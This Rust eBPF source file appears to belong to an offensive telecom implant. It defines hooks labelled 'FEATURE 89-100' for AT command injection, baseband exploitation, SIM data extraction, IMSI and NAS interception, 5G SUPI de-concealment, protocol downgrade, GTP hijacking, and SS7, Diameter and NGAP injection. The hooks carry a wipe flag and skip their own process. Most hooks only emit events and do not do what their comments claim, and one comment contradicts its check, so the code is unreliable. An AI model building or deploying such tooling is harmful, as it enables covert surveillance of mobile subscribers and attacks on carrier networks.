use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, EVENT_AT_CMD_INJECT, EVENT_BASEBAND_EXPLOIT, EVENT_DIAMETER_EXPLOIT,
    EVENT_GTP_TUNNEL_HIJACK, EVENT_IMSI_INTERCEPT, EVENT_N2_INTERFACE_INJECT,
    EVENT_NAS_INTERCEPT, EVENT_PROTOCOL_DOWNGRADE, EVENT_RRC_REDIRECT, EVENT_SIM_CLONE,
    EVENT_SS7_MAP_INJECT, EVENT_SUPI_DECONCEAL,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const GTP_PORT: u16 = 2152;
const SS7_SCTP_PORT: u16 = 2905;
const DIAMETER_PORT: u16 = 3868;
const NGAP_PORT: u16 = 38412;

// ──────────────────────────────────────────────
// FEATURE 89: AT Command Injection (2G/3G/4G modem)
// Intercepts tty_write to modem devices, injects AT commands
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_at_cmd_inject(ctx: ProbeContext) -> u32 {
    try_at_cmd_inject(&ctx).unwrap_or_default()
}

fn try_at_cmd_inject(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let fd: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { MODEM_FDS.get(&fd) }.is_none() {
        return Ok(0);
    }

    if let Some(cmd_buf) = unsafe { AT_CMD_INJECT_QUEUE.get(&fd) } {
        let cmd_hash = hash_bytes(cmd_buf);
        let event = EventHeader {
            event_type: EVENT_AT_CMD_INJECT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: cmd_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 90: Baseband Memory Exploitation (2G/3G)
// Targets USB bulk transfers to baseband processor
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_baseband_exploit(ctx: ProbeContext) -> u32 {
    try_baseband_exploit(&ctx).unwrap_or_default()
}

fn try_baseband_exploit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let urb_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let endpoint: u8 = unsafe {
        bpf_probe_read_kernel((urb_ptr + 20) as *const u8).map_err(|_| 1i64)?
    };

    // Bulk OUT endpoints to baseband (endpoint & 0x80 == 0 means OUT)
    if endpoint & 0x80 != 0 {
        return Ok(0);
    }

    let transfer_len: u32 = unsafe {
        bpf_probe_read_kernel((urb_ptr + 136) as *const u32).map_err(|_| 1i64)?
    };

    if transfer_len > 256 {
        let event = EventHeader {
            event_type: EVENT_BASEBAND_EXPLOIT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: transfer_len as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 91: SIM Data Extraction (all generations)
// Intercepts APDU commands to SIM card readers
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_sim_clone(ctx: ProbeContext) -> u32 {
    try_sim_clone(&ctx).unwrap_or_default()
}

fn try_sim_clone(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let fd: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };

    // Check for SIM APDU SELECT command (CLA=A0, INS=A4)
    let cla: u8 = unsafe { bpf_probe_read_kernel(buf_ptr as *const u8).map_err(|_| 1i64)? };
    let ins: u8 = unsafe {
        bpf_probe_read_kernel((buf_ptr + 1) as *const u8).map_err(|_| 1i64)?
    };

    if cla == 0xA0 && (ins == 0xA4 || ins == 0xB0 || ins == 0xB2) {
        let event = EventHeader {
            event_type: EVENT_SIM_CLONE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((ins as u64) << 32) | fd as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 92: IMSI Interception (all generations)
// Captures IMSI from attach/identity response messages
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_imsi_intercept(ctx: ProbeContext) -> u32 {
    try_imsi_intercept(&ctx).unwrap_or_default()
}

fn try_imsi_intercept(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let len: u32 = unsafe { ctx.arg(2).ok_or(1i64)? };

    if len < 10 {
        return Ok(0);
    }

    // NAS Identity Response message type = 0x56
    let msg_type: u8 = unsafe {
        bpf_probe_read_kernel(buf_ptr as *const u8).map_err(|_| 1i64)?
    };

    if msg_type == 0x56 {
        let imsi_first8: u64 = unsafe {
            bpf_probe_read_kernel((buf_ptr + 2) as *const u64).map_err(|_| 1i64)?
        };

        if unsafe { IMSI_TARGETS.get(&imsi_first8) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_IMSI_INTERCEPT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: imsi_first8,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 93: Protocol Downgrade Attack (4G/5G → 2G)
// Injects TAU Reject / RRC Redirect to force downgrade
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_protocol_downgrade(ctx: TcContext) -> i32 {
    try_protocol_downgrade(&ctx).unwrap_or_default()
}

fn try_protocol_downgrade(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8) as u32 {
        return Ok(0);
    }

    // Check for GTP-C messages (UDP 2123) carrying NAS
    if let Some(state) = unsafe { TELECOM_STATE.get(0) } {
        if *state == 0 {
            return Ok(0);
        }
    }

    let event = EventHeader {
        event_type: EVENT_PROTOCOL_DOWNGRADE,
        pid: 0,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: pkt_len as u64,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 94: GTP Tunnel Hijacking (4G/5G core)
// Manipulates GTP-U/C TEIDs on S1-U/N3 interface
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_gtp_hijack(ctx: XdpContext) -> u32 {
    match try_gtp_hijack(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_gtp_hijack(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();
    let pkt_len = data_end - data;

    if pkt_len < ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };

    // UDP = 17
    if protocol != 17 {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    if dst_port != GTP_PORT {
        return Ok(xdp_action::XDP_PASS);
    }

    // GTP header starts after UDP
    let gtp_hdr = udp_hdr + UDP_HDR_LEN;
    if gtp_hdr + 8 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let teid = unsafe { u32::from_be(*((gtp_hdr + 4) as *const u32)) };

    if unsafe { GTP_TUNNEL_STATE.get(&teid) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_GTP_TUNNEL_HIJACK,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: teid as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 95: SS7 MAP Injection (2G/3G signaling)
// Crafts MAP operations via SIGTRAN/M3UA
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ss7_inject(ctx: TcContext) -> i32 {
    try_ss7_inject(&ctx).unwrap_or_default()
}

fn try_ss7_inject(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + 12) as u32 {
        return Ok(0);
    }

    // SCTP on port 2905 (M3UA/SIGTRAN)
    // Check inject queue for pending MAP messages
    let slot: u32 = 0;
    if let Some(payload) = unsafe { SS7_INJECT_QUEUE.get(&slot) } {
        let msg_hash = hash_bytes(payload);
        let event = EventHeader {
            event_type: EVENT_SS7_MAP_INJECT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: msg_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 96: Diameter AVP Manipulation (4G/5G signaling)
// Intercepts and modifies Diameter S6a/S6b messages
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_diameter_exploit(ctx: TcContext) -> i32 {
    try_diameter_exploit(&ctx).unwrap_or_default()
}

fn try_diameter_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + 20) as u32 {
        return Ok(0);
    }

    // Look for active Diameter session state
    let session_key: u32 = 0;
    if let Some(state) = unsafe { DIAMETER_STATE.get(&session_key) } {
        let event = EventHeader {
            event_type: EVENT_DIAMETER_EXPLOIT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: state.msg_type as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 97: RRC Connection Redirect (4G/5G radio)
// Injects RRCConnectionRelease with redirect info
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_rrc_redirect(ctx: ProbeContext) -> u32 {
    try_rrc_redirect(&ctx).unwrap_or_default()
}

fn try_rrc_redirect(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    // Check if target cell for redirect is configured
    let target_arfcn: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { DOWNGRADE_TARGETS.get(&target_arfcn) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_RRC_REDIRECT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: target_arfcn as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 98: NAS Message Interception (4G/5G)
// Captures NAS PDUs before encryption
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_nas_intercept(ctx: ProbeContext) -> u32 {
    try_nas_intercept(&ctx).unwrap_or_default()
}

fn try_nas_intercept(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let buf_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let buf_len: u32 = unsafe { ctx.arg(1).ok_or(1i64)? };

    if buf_len < 2 || buf_len > 512 {
        return Ok(0);
    }

    // NAS Security Header Type + Protocol Discriminator
    let hdr_byte: u8 = unsafe {
        bpf_probe_read_kernel(buf_ptr as *const u8).map_err(|_| 1i64)?
    };

    // Protocol discriminator 0x7E = 5G NAS, 0x07 = EPS NAS
    let pd = hdr_byte & 0x0F;
    if pd != 0x07 && pd != 0x0E {
        return Ok(0);
    }

    if let Some(buf) = NAS_INTERCEPT_BUF.reserve::<[u8; 64]>(0) {
        let event = EventHeader {
            event_type: EVENT_NAS_INTERCEPT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: buf_len as u64,
        };
        let _ = EVENTS.output(&event, 0);
        buf.discard(0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 99: 5G SUPI De-concealment
// Intercepts ECIES decryption to recover SUPI from SUCI
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_supi_deconceal(ctx: ProbeContext) -> u32 {
    try_supi_deconceal(&ctx).unwrap_or_default()
}

fn try_supi_deconceal(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    // Intercept ECIES decryption output (SUPI plaintext)
    let output_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let supi_hash: u64 = unsafe {
        bpf_probe_read_kernel(output_ptr as *const u64).map_err(|_| 1i64)?
    };

    if unsafe { IMSI_TARGETS.get(&supi_hash) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_SUPI_DECONCEAL,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: supi_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 100: 5G N2 Interface Injection (AMF↔gNB)
// Injects NGAP messages on SCTP port 38412
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_n2_inject(ctx: TcContext) -> i32 {
    try_n2_inject(&ctx).unwrap_or_default()
}

fn try_n2_inject(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + 12) as u32 {
        return Ok(0);
    }

    // Check for NGAP injection state
    if let Some(state) = unsafe { TELECOM_STATE.get(1) } {
        if *state == 0 {
            return Ok(0);
        }

        let event = EventHeader {
            event_type: EVENT_N2_INTERFACE_INJECT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: *state as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// Helper: simple byte hash for eBPF context
// ──────────────────────────────────────────────

#[inline(always)]
fn hash_bytes(data: &[u8; 64]) -> u64 {
    let mut h: u64 = 0x517cc1b727220a95;
    let mut i = 0;
    while i < 64 {
        h = h.wrapping_mul(0x100000001b3).wrapping_add(data[i] as u64);
        i += 1;
    }
    h
}
